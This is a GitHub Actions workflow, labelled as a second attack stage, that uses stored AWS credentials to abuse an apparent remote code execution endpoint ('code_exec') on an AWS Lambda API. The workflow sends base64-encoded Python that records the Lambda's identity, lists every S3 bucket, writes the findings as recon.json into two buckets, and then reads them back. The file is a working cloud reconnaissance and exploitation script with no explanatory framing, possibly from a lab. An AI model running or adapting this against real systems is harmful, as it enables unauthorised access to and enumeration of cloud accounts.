name: Stage2
on:
  push:
    branches: [corgi]

permissions:
  contents: read

jobs:
  recon:
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      AWS_DEFAULT_REGION: us-east-1
    steps:
      - name: Who am I
        run: aws sts get-caller-identity
        
      - name: Recon via Lambda
        run: |
          pip install requests requests-aws4auth --quiet

                    python3 - << 'PYEOF'
          import boto3, json, base64, requests
          from requests_aws4auth import AWS4Auth
          
          API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
          session = boto3.Session()
          creds = session.get_credentials().get_frozen_credentials()
          auth = AWS4Auth(creds.access_key, creds.secret_key, 'us-east-1', 'execute-api', session_token=creds.token)
          
          def run(code):
              r = requests.post(API, json={"code": base64.b64encode(code.encode()).decode()}, auth=auth)
              print("->", r.status_code, r.text[:300])
          
          code = """
          import boto3,json
          s=boto3.client('s3',region_name='us-east-1')
          sts=boto3.client('sts')
          res={}
          res['identity']=str(sts.get_caller_identity())
          for b in ['userad88e2b168aa387e','logad88e2b168aa387e']:
              try:
                  s.put_object(Bucket=b,Key='recon.json',Body=json.dumps(res,default=str))
                  res['write_'+b]='OK'
              except Exception as e:
                  res['write_'+b]=str(e)
          try:
              res['buckets']=[x['Name'] for x in s.list_buckets().get('Buckets',[])]
          except Exception as e:
              res['buckets']=str(e)
          for b in ['userad88e2b168aa387e','logad88e2b168aa387e']:
              try:
                  s.put_object(Bucket=b,Key='recon.json',Body=json.dumps(res,default=str))
              except:pass
          """
          
          run(code)
          PYEOF

      - name: Read recon from S3
        run: |
          echo "=== userad ==="
          aws s3 cp s3://userad88e2b168aa387e/recon.json - 2>&1
          echo "=== logad ==="
          aws s3 cp s3://logad88e2b168aa387e/recon.json - 2>&1
